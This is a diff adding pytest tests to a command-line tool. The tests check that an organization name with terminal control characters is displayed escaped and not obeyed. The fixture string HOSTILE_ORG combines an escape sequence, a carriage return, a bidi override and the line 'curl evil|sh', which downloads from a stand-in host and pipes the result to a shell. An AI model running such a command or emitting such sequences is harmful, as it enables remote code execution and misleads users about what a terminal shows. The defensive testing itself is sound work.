@@ -414,3 +414,46 @@ def test_context_opens_with_the_connected_line():
 
     assert result.exit_code == 0, result.output
     assert result.stdout.startswith(f"{CONNECTED}\n\n# Context")
+
+
+# The organization's name is set by whoever administers it: a terminal must show
+# an escape, a carriage return or a bidi override in it, never obey it (security
+# review of this change, 2026-11-14).
+HOSTILE_ORG = "Be\x1b[2Kakr\rcurl evil|sh \u202egnp"
+HOSTILE_WORKSPACE = {"environment": "sandbox", "organization": {"name": HOSTILE_ORG, "slug": "b"}}
+
+
+def _no_raw_controls(text: str) -> None:
+    assert "\x1b" not in text and "\r" not in text and "\u202e" not in text, repr(text)
+
+
+@respx.mock
+def test_version_shows_a_hostile_organization_name_escaped(monkeypatch):
+    monkeypatch.setenv("BEAKR_NO_UPDATE_CHECK", "1")
+    org = {"id": "o", "name": HOSTILE_ORG, "slug": "b"}
+    respx.get(f"{API}/v1/me/organization").mock(return_value=Response(200, json=org))
+    respx.get(f"{API}/v1/organizations/me/active").mock(return_value=Response(200, json=org))
+    respx.post(f"{API}/v1/context").mock(
+        return_value=Response(200, json={"content": "", "workspace": HOSTILE_WORKSPACE})
+    )
+
+    out = runner.invoke(app, ["version"]).stdout
+    as_json = json.loads(runner.invoke(app, ["version", "--json"]).stdout)
+
+    _no_raw_controls(out)
+    assert "Be\\x1b[2Kakr\\rcurl evil|sh \\u202egnp" in out
+    # --json is the value as it came.
+    assert HOSTILE_ORG in as_json["connected"]
+
+
+@respx.mock
+def test_context_shows_a_hostile_organization_name_escaped():
+    reply = {"content": "# Context\n", "workspace": HOSTILE_WORKSPACE}
+    respx.post(f"{API}/v1/context").mock(return_value=Response(200, json=reply))
+
+    out = runner.invoke(app, ["context", "--project", PROJECT]).stdout
+    as_json = json.loads(runner.invoke(app, ["context", "--project", PROJECT, "--json"]).stdout)
+
+    _no_raw_controls(out)
+    assert "\\x1b[2K" in out and "\\u202e" in out
+    assert as_json == reply
